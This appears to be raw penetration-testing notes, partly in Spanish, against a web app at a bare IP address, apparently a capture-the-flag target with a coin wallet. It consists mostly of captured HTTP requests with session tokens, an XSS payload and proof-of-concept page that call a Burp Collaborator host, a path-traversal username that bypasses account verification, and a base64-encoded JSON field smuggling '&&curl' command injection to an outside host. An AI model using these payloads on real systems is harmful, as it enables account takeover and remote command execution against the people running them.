```POST /signup HTTP/1.1
POST /signup HTTP/1.1
Host: 165.22.122.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: application/x-www-form-urlencoded
Referer: http://165.22.122.9/invite-only
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es;q=0.8
Connection: close
Content-Length: 66

signup_frm_username=broodkiller&signup_frm_password=123456&submit=
```





```
GET HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 27 Jan 2021 15:13:31 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=M2Q4OWI3NjgxMGM0YmUxMWEzODdhOTJiNTllYWE3YmEyMTQyZTI5NGZmNTYwZGQxYzM2Y2QzNGNiOGMyOTRlNTM1YmM1MWE1YjY2NDdlY2E2OTU1NWQ3ZjcyN2UwNGFmOWQ4MWMzYzJhMGExNmYzYzYyZDNmOTQ2OGE2OWY4Mzg%3D; expires=Thu, 28-Jan-2021 15:13:31 GMT; Max-Age=86400; path=/
Location: /dashboard
Content-Length: 0
```







```
GET /dashboard HTTP/1.1
Host: 165.22.122.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://165.22.122.9/invite-only
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es;q=0.8
cookie:token=M2Q4OWI3NjgxMGM0YmUxMWEzODdhOTJiNTllYWE3YmEyMTQyZTI5NGZmNTYwZGQxYzM2Y2QzNGNiOGMyOTRlNTM1YmM1MWE1YjY2NDdlY2E2OTU1NWQ3ZjcyN2UwNGFmOWQ4MWMzYzJhMGExNmYzYzYyZDNmOTQ2OGE2OWY4Mzg%3D;
Connection: close
```

```
function getVerification(id){
    $.getJSON('/verify/' + id + '.json',function(resp){
        let profile_picture = '/user/' + resp.user.username + '/profile.jpg';
        let confirm_link = '/verify/' + resp.user.hash + '/confirm';
        let deny_link = '/verify/' + resp.id + '/deny';
        let client_name = resp.firstname + '' + resp.lastname;
        $('div.client_name').html(client_name);
        $('img.profile_picture').attr('src',profile_picture);
        $('img.proof_picture').attr('src', resp.proof_img );
        $('a.confirm_link').attr('href',confirm_link);
        $('a.deny_link').attr('href',deny_link);
    }).fail(function(){
        alert('failed');
    });
}
```



```
verify account (GET/POST da igual resultado)

GET 
/verify/da98f05fb0cbd1ace1cab4e04cf1d02b0c955543f9e1c168e8904e36abeee724c213e98384c699a719cbfc6d3abd1dd69ce8af34ce2eee16affc3189a260178a/confirm HTTP/1.1
Host: 165.22.122.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://165.22.122.9/invite-only
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es;q=0.8
cookie:token=M2Q4OWI3NjgxMGM0YmUxMWEzODdhOTJiNTllYWE3YmEyMTQyZTI5NGZmNTYwZGQxYzM2Y2QzNGNiOGMyOTRlNTM1YmM1MWE1YjY2NDdlY2E2OTU1NWQ3ZjcyN2UwNGFmOWQ4MWMzYzJhMGExNmYzYzYyZDNmOTQ2OGE2OWY4Mzg%3D;
Connection: close


HTTP/1.1 403 Forbidden
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 27 Jan 2021 15:40:35 GMT
Content-Type: application/json
Connection: close
Content-Length: 48

["You do not have access to view this resource"]
```

new token

MzcxYjZiOWFkMjBhN2RhMzVlYWQzNjUzOTQwOGNhZTZlYjYyYmVmNDQ0YWI3ZTc5ZjE5YTU4OTM2MTVjMjA2MjYwNjllOWI1NWUxOTFiODNlMWM5NTdkYjIwOWMwMmY3ZDcxNWIxN2ZkMWQ0MWQ3YzE4MDE0Yzc4YzNjOTJkNmQ%3D%3D

371b6b9ad20a7da35ead36539408cae6eb62bef444ab7e79f19a5893615c20626069e9b55e191b83e1c957db209c02f7d715b17fd1d41d7c18014c78c3c92d6d



en view-source:http://165.22.122.9/dashboard/profile tengo el user_hash

```
<div class="alert alert-danger text-center">
                            <p>Profile picture changes have temporarily been disabled</p>
                        </div>
                        <input type="hidden" name="user_hash" value="iZjTxek0">
```

```
broodkiller  iZjTxek0

broodkiller1 z2hfb0q1

broodkiller2 mSbvuPk7

broodkiller3 AM7KvOYO
```





```
        var client_name = 
        let client_name = resp.firstname + '' + resp.lastname;
        $('div.client_name').html(client_name);
        
        $('a.deny_link').attr('href','/verify/' + resp.user.hash + '/confirm');
```

test SSRF

```
;</div><script>$.get('http://r1t3lkbki6g041hz0fbpcjkpggm9ay.burpcollaborator.net');</script>
```





```
SSRF para verify

<html>
<head><script src="https://code.jquery.com/jquery-1.11.3.js"></script></head>

<body>
<input type="text" id="n" value="john">
<input type="text" id="a" value=";</div><script>$.get('http://localhost/verify/iZjTxek0/confirm');</script>">
<script>
$(function () {
	let confirm_link = '/verify/' + resp.user.hash + '/confirm';
	let deny_link = '/verify/' + resp.id + '/deny';
	let client_name = $("#n").val() + '' + $("#a").val();
	$('div.client_name').html(client_name);
	$('a.confirm_link').attr('href',confirm_link);
	$('a.deny_link').attr('href',deny_link);
});
</script>
<div class='client_name'></div>
<a class='confirm_link' href="" onclick='alert("confirm")'>confirm</a>
<a class='deny_link' href="" onclick='alert("deny")'>deny</a>
</body>
</html>
```

### poc js

```
<html>
<head><script src="https://code.jquery.com/jquery-1.11.3.js"></script></head>
<body>
<input type="text" id="n" value="{{curl http://2.r1t3lkbki6g041hz0fbpcjkpggm9ay.burpcollaborator.net}}">
<input type="text" id="a" value=";$('a.deny_link').attr('href','/verify/mSbvuPk7/confirm');</script>">
<script>
$(function () {
	let confirm_link = '/verify/' + 'y' + '/confirm';
	let deny_link = '/verify/' + 'z' + '/deny';
	let client_name = $("#n").val() + '' + $("#a").val();
	$('div.client_name').html(client_name);
	$('a.confirm_link').attr('href',confirm_link);
	$('a.deny_link').attr('href',deny_link);
});
</script>
<div class='client_name'></div>
<a class='confirm_link' href="" onclick='alert("confirm")'>confirm</a>
<a class='deny_link' href="" onclick='alert("deny")'>deny</a>
</body>
</html>
```





### confirmar account payload, modificando username

```
POST /dashboard/profile HTTP/1.1
Host: 165.22.122.9
Content-Length: 67
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://165.22.122.9
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://165.22.122.9/dashboard/profile
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es;q=0.8
Cookie: token=NjQ3NzQ4YzVjZGEyZTRiNzA4ZDkxY2RhM2U2NzE0OGMyYzk3OTRlNDQxMGJmZjM1NDQ4NTU3YmQ0YzE4MGJlZGE0MWRiYjBiNmNjOGI1YWExMmFmNWIwYjA5YzgyNzZkMjJkNTg0ODZjYTY5YjY5NTVkM2Y2Nzg1MmFhMDliZmQ%3D
Connection: close

user_hash=mSbvuPk7&update_frm_username=../verify/mSbvuPk7/confirm?a
```





envio de coins x wallet

0.0001

```
0.0001
{"data":"{"txn_id":"51c5f3a2f5044afa92f441c4ed90d8a8","txn_server":"node1"}","challenge":"59391ef7887dfb485f9029eaf63f73e2"}
```



5
eyJkYXRhIjoiZXlKMGVHNWZhV1FpT2lKaE1UQmxaamsxWXpWaFpEZzNabUl3T0RjNVptWTFaR0V3WVROaFlXSXdZU0lzSW5SNGJsOXpaWEoyWlhJaU9pSnViMlJsTVNKOSIsImNoYWxsZW5nZSI6ImUzMjEwYTNiN2Q3MGM1N2Q4ODE4ZmVmZTBkNTdiNTM4In0





eyJkYXRhIjoiZXlKMGVHNWZhV1FpT2lKaVl6STBNamsyTmpsbE5XUmhNVGMwWmpCbFlqUmlNbUV6TlRZME0yUXlaQ0lzSW5SNGJsOXpaWEoyWlhJaU9pSnViMlJsTVNKOSIsImNoYWxsZW5nZSI6IicifQ
{"data":"{"txn_id":"2a8403ffcd2001e4cf67eecac842b0da","txn_server":"node1"}","challenge":"16c7ddb46913917a3b8fc7f73e71d471"}
{"data":"{"txn_id":"140bb4944b0e0d8e4ed8f4a9a65a898e","txn_server":"node1"}","challenge":"48841875a05ccedfdda96f8ef96f8f02"}
{"data":"{"txn_id":"46fbaa7f6eea9b40c61510a012583ef0","txn_server":"node1"}","challenge":"ebdd13d4692f6fe260602dd0bf24babd"}
{"data":"{"txn_id":"15ed604de2ef3b0ebcff8e9fa103309c","txn_server":"node1"}","challenge":"3266fba14ff6ad901ce0a9b068fb41ac"}

{"data":"eyJ0eG5faWQiOiJvcDI0Mjk2NjlyNXFuMTc0czBybzRvMm4zNTY0M3EycSYmY3VybCBodHRwOi8vZ2kyczI5czl6dnhwbHF5b2g0c2V0ODFleDUzNXJ1LmJ1cnBjb2xsYWJvcmF0b3IubmV0IiwidHhuX3NlcnZlciI6Im5vZGUyJiZjdXJsIGh0dHA6Ly9naTJzMjlzOXp2eHBscXlvaDRzZXQ4MWV4NTM1cnUuYnVycGNvbGxhYm9yYXRvci5uZXQifQ"}